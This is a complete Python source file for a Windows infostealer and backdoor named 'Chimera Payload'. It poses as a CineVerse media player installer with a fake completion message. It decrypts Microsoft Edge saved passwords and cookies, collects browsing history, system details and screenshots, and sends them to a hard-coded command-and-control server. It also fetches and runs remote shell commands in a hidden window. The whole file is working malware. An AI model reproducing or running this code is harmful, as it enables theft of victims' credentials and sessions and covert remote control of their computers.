#!/usr/bin/env python3
"""
Chimera Payload - Edge Fixed (Passwords + Cookies)
"""
import os
import sys
import time
import json
import socket
import subprocess
import urllib.request
import urllib.error
import ctypes
import base64
import platform
import sqlite3
import shutil
import re
from datetime import datetime

KALI_IP = "10.0.2.20"
C2_URL = f"http://{KALI_IP}:8080"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_mac():
    try:
        import uuid
        mac = uuid.getnode()
        return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
    except:
        return "00-00-00-00-00-00"

def get_victim_id():
    hostname = socket.gethostname()
    ip = get_local_ip()
    mac = get_mac()
    return f"{hostname}_{mac.replace(':', '')}_{ip.replace('.', '_')}"

def get_log_file():
    temp = os.environ.get('TEMP', 'C:\\Temp')
    if not os.path.exists(temp):
        try:
            os.makedirs(temp, exist_ok=True)
        except:
            temp = os.path.dirname(sys.executable)
    return os.path.join(temp, 'chimera.log')

LOG_FILE = get_log_file()

def log(msg):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except:
        pass

def send_to_c2(endpoint, data):
    try:
        req = urllib.request.Request(
            f"{C2_URL}{endpoint}",
            data=json.dumps(data, default=str).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        response = urllib.request.urlopen(req, timeout=15)
        return True
    except Exception as e:
        log(f"Send error: {e}")
        return False

def get_system_info():
    info = {
        "hostname": socket.gethostname(),
        "ip": get_local_ip(),
        "mac": get_mac(),
        "os": platform.system(),
        "os_version": platform.version(),
        "architecture": platform.machine(),
        "cpu": platform.processor(),
        "username": os.getlogin() if hasattr(os, 'getlogin') else "Unknown",
        "domain": os.environ.get('USERDOMAIN', 'Unknown')
    }
    
    try:
        import psutil
        info["memory"] = f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
        info["cpu_cores"] = psutil.cpu_count()
        info["cpu_usage"] = psutil.cpu_percent(interval=0.5)
        
        disks = []
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                disks.append({
                    "mount": part.mountpoint,
                    "total": f"{round(usage.total / (1024**3), 2)} GB",
                    "used": f"{round(usage.used / (1024**3), 2)} GB",
                    "free": f"{round(usage.free / (1024**3), 2)} GB"
                })
            except:
                pass
        info["disks"] = disks
    except:
        pass
    
    return info

def capture_screenshot():
    try:
        from PIL import ImageGrab
        import io
        log("📸 Capturing screenshot...")
        screenshot = ImageGrab.grab(all_screens=True)
        buffered = io.BytesIO()
        screenshot.save(buffered, format="PNG")
        img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
        log(f"✅ Screenshot: {len(buffered.getvalue())} bytes")
        return img_base64
    except Exception as e:
        log(f"Screenshot error: {e}")
        return None

# ============================================
# EDGE PASSWORDS (FIXED)
# ============================================

def get_edge_master_key():
    """Get Edge master key for decryption"""
    try:
        import win32crypt
        
        local_state_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State")
        if not os.path.exists(local_state_path):
            log("Edge Local State not found")
            return None
        
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
        
        # Decrypt with DPAPI
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        log("✅ Edge master key retrieved")
        return master_key
    except Exception as e:
        log(f"Master key error: {e}")
        return None

def decrypt_edge_data(encrypted_data, master_key):
    """Decrypt Edge data using master key"""
    try:
        from Crypto.Cipher import AES
        
        if not master_key:
            return None
        
        # Check if data is encrypted with v10/v11
        if encrypted_data.startswith(b'v10') or encrypted_data.startswith(b'v11'):
            encrypted_data = encrypted_data[3:]  # Remove version prefix
            nonce = encrypted_data[3:15]
            ciphertext = encrypted_data[15:-16]
            tag = encrypted_data[-16:]
            
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8')
        else:
            # Try DPAPI fallback
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1].decode('utf-8')
    except Exception as e:
        log(f"Decrypt error: {e}")
        return None

def get_edge_passwords():
    """Get Edge saved passwords"""
    passwords = []
    
    # First, get master key
    master_key = get_edge_master_key()
    if not master_key:
        log("❌ Could not get master key")
        return passwords
    
    edge_login_paths = [
        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data")
    ]
    
    for login_path in edge_login_paths:
        if os.path.exists(login_path):
            try:
                # Copy file first (bypass lock)
                temp_path = os.path.join(os.environ['TEMP'], 'edge_login_temp.db')
                shutil.copy2(login_path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                count = 0
                for row in cursor.fetchall():
                    url, username, enc_password = row
                    if enc_password:
                        password = decrypt_edge_data(enc_password, master_key)
                        if password:
                            passwords.append({
                                "browser": "Edge",
                                "url": url if url else "",
                                "username": username if username else "",
                                "password": password
                            })
                            count += 1
                
                conn.close()
                os.remove(temp_path)
                log(f"✅ Edge passwords: {count} found")
                return passwords
            except Exception as e:
                log(f"Edge passwords error: {e}")
                try:
                    os.remove(temp_path)
                except:
                    pass
    
    return passwords

# ============================================
# EDGE COOKIES (FIXED)
# ============================================

def get_edge_cookies():
    """Get Edge browser cookies"""
    cookies = []
    
    # Get master key
    master_key = get_edge_master_key()
    if not master_key:
        log("❌ Could not get master key for cookies")
        return cookies
    
    edge_cookie_paths = [
        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"),
        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies")
    ]
    
    for cookie_path in edge_cookie_paths:
        if os.path.exists(cookie_path):
            try:
                temp_path = os.path.join(os.environ['TEMP'], 'edge_cookies_temp.db')
                shutil.copy2(cookie_path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                
                try:
                    cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies LIMIT 200")
                except:
                    # Try without encrypted_value
                    cursor.execute("SELECT host_key, name, value, path, expires_utc FROM cookies LIMIT 200")
                    for row in cursor.fetchall():
                        host_key, name, value, path, expires_utc = row
                        if value:
                            cookies.append({
                                "browser": "Edge",
                                "domain": host_key if host_key else "",
                                "name": name if name else "",
                                "value": value,
                                "path": path if path else "/",
                                "expires": str(expires_utc) if expires_utc else ""
                            })
                    conn.close()
                    os.remove(temp_path)
                    log(f"✅ Edge cookies (plain): {len(cookies)} found")
                    return cookies
                
                count = 0
                for row in cursor.fetchall():
                    host_key, name, encrypted_value, path, expires_utc = row
                    if encrypted_value:
                        value = decrypt_edge_data(encrypted_value, master_key)
                        if value:
                            cookies.append({
                                "browser": "Edge",
                                "domain": host_key if host_key else "",
                                "name": name if name else "",
                                "value": value,
                                "path": path if path else "/",
                                "expires": str(expires_utc) if expires_utc else ""
                            })
                            count += 1
                
                conn.close()
                os.remove(temp_path)
                log(f"✅ Edge cookies: {count} found")
                return cookies
            except Exception as e:
                log(f"Edge cookies error: {e}")
                try:
                    os.remove(temp_path)
                except:
                    pass
    
    return cookies

# ============================================
# EDGE HISTORY
# ============================================

def get_edge_history():
    history = []
    edge_paths = [
        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"),
        os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\History")
    ]
    
    for history_path in edge_paths:
        if os.path.exists(history_path):
            try:
                temp_path = os.path.join(os.environ['TEMP'], 'edge_history_temp.db')
                shutil.copy2(history_path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                
                for row in cursor.fetchall():
                    url, title, timestamp = row
                    history.append({
                        "browser": "Edge",
                        "url": url if url else "",
                        "title": title if title else "",
                        "timestamp": str(timestamp) if timestamp else ""
                    })
                
                conn.close()
                os.remove(temp_path)
                log(f"✅ Edge history: {len(history)} entries")
                return history
            except Exception as e:
                log(f"Edge history error: {e}")
                try:
                    os.remove(temp_path)
                except:
                    pass
    
    return history

def get_browser_data():
    """Get all browser data"""
    data = {
        "history": [],
        "passwords": [],
        "cookies": []
    }
    
    log("📊 Collecting Edge data...")
    
    data["history"] = get_edge_history()
    data["passwords"] = get_edge_passwords()
    data["cookies"] = get_edge_cookies()
    
    log(f"📊 Summary - History: {len(data['history'])}, Passwords: {len(data['passwords'])}, Cookies: {len(data['cookies'])}")
    
    return data

def register():
    info = get_system_info()
    data = {
        "victim_id": get_victim_id(),
        "hostname": info["hostname"],
        "ip": info["ip"],
        "mac": info["mac"],
        "os": info["os"],
        "os_version": info["os_version"],
        "architecture": info["architecture"],
        "cpu": info.get("cpu", "Unknown"),
        "memory": info.get("memory", "Unknown"),
        "disk": json.dumps(info.get("disks", [])),
        "username": info.get("username", "Unknown"),
        "domain": info.get("domain", "Unknown")
    }
    return send_to_c2("/api/register", data)

def send_system_info():
    info = get_system_info()
    data = {"victim_id": get_victim_id(), "type": "system_info", "content": info}
    return send_to_c2("/api/collect", data)

def send_screenshot():
    img = capture_screenshot()
    if not img:
        return False
    data = {
        "victim_id": get_victim_id(),
        "type": "screenshot",
        "content": {"image": img, "size": len(img), "timestamp": datetime.now().isoformat()}
    }
    return send_to_c2("/api/collect", data)

def send_browser_data():
    browser_data = get_browser_data()
    data = {
        "victim_id": get_victim_id(),
        "type": "browser_data",
        "content": browser_data
    }
    return send_to_c2("/api/collect", data)

def execute_command(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return result.stdout if result.stdout else result.stderr
    except subprocess.TimeoutExpired:
        return "[Command timed out]"
    except Exception as e:
        return f"[Error: {str(e)}]"

def get_commands():
    try:
        data = {"victim_id": get_victim_id()}
        req = urllib.request.Request(
            f"{C2_URL}/api/get_command",
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        response = urllib.request.urlopen(req, timeout=10)
        result = json.loads(response.read().decode())
        if result.get('has_command'):
            command = result.get('command')
            command_id = result.get('command_id')
            log(f"Got command: {command}")
            output = execute_command(command)
            result_data = {"victim_id": get_victim_id(), "command_id": command_id, "result": output}
            send_to_c2("/api/command_result", result_data)
            return True
        return False
    except Exception as e:
        log(f"Get commands error: {e}")
        return False

def main():
    try:
        ctypes.windll.kernel32.FreeConsole()
    except:
        pass
    
    try:
        ctypes.windll.user32.MessageBoxW(0, "Media Player Installation Complete!", "CineVerse", 0)
    except:
        pass
    
    log("=" * 60)
    log("Chimera Payload - Edge Fixed Full")
    log(f"Victim ID: {get_victim_id()}")
    log(f"Log File: {LOG_FILE}")
    log("=" * 60)
    
    os.makedirs(os.environ.get('TEMP', 'C:\\Temp'), exist_ok=True)
    
    register()
    time.sleep(1)
    send_system_info()
    time.sleep(1)
    send_screenshot()
    time.sleep(1)
    send_browser_data()
    
    log("✅ All data sent!")
    
    counter = 0
    while True:
        try:
            if counter % 5 == 0:
                get_commands()
            if counter % 30 == 0:
                send_screenshot()
            if counter % 60 == 0:
                send_system_info()
            if counter % 120 == 0:
                send_browser_data()
            time.sleep(1)
            counter += 1
        except Exception as e:
            log(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()

